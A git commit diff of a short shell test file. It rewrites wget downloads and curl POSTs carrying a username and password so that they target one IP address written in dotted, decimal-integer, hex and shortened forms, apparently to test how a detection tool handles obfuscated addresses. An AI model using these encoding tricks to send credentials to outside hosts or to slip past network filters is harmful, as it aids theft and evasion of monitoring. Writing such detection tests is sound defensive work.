1915e24ccdfcda231c1ec28801391f16621cd43c
RonMankivsky <87318489+RonMankivsky@users.noreply.github.com>
2022-01-02 13:42:27 +0200

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,2 +1,13 @@
-wget https://textspeier.de -o /tmp/test1
-curl -X POST -d "username=tembel&password=1q2w3e" https://slot0.agielity.com
+wget 1.15.121.25 -o /tmp/test1
+curl -X POST -d "username=tembel&password=1q2w3e" 1.15.121.25
+
+wget 17791257 -o /tmp/test1
+curl -X POST -d "username=tembel&password=1q2w3e" 17791257
+
+wget 0x010f7919 -o /tmp/test1
+curl -X POST -d "username=tembel&password=1q2w3e" 0x010f7919
+
+wget 116.23.174 -o /tmp/test1
+curl -X POST -d "username=tembel&password=1q2w3e" 116.23.174
+
+
